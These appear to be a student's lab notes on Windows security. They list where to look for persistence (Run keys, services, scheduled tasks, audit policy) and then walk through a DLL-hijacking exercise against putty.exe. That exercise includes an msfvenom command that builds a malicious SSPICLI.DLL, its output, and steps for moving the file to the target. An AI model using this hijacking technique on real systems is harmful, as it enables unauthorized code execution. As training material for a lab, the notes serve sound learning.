UAC settings
- Using regedit
    - Look for run & runonce keys (HKCU & HKLM)
    - `\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
    - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

Services
- search `services` in search bar
    - Look for weird names/exe
    - Investigate a service w/ no description (sort by description tab to see empty fields)
    - Right click -> properties to find origin path to investigate

Scheduled tasks
- search `Task Scheduler` in search bar
    - Click Task Scheduler Library
    - Look at the tabs `Triggers`, `Actions`, etc

Audit Logging
- run command via powershell `auditpol /get /category:*`
    - Look at the `Sucess` & `Failures` policies

DLL highjacking
- Download `putty.exe` from resources
- Open `ProcMon`. Run `procmon /acceptEula` via powershell to open
    - Click filter:
    - Process Name contains `putty.exe`
    - path contains `.dll`
    - Result is `NAME NOT FOUND`
    - Apply filter
    - Run `putty.exe` (double clicking)
    - Use `C:\Users\student\Downloads\SSPICLI.DLL`
- Create payload from Linux 
    - `msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.DLL`
    
    ```bash
    student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.DLL
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x86 from the payload
    No encoder specified, outputting raw payload
    Payload size: 242 bytes
    Final size of dll file: 8704 bytes

    student@lin-ops:~$ ls | grep SSPICLI.DLL
    SSPICLI.DLL
    ```
    - Windows
        - SCP `source` `destination`
        - SCP student@`lin_op_ip`:`location` `location_of_putty.exe`
        - SCP student@10.50.158.143:/home/student/SSPICLI.DLL C:\Users\student\Downloads
    
    (if you cant do scp)
    - Linux
        - python -m http.server 8080 or python3 -m http.server 8080
    - Windows
        - In browser: http://10.50.158.143:8080
        - Download the file `SSPICLI.DLL`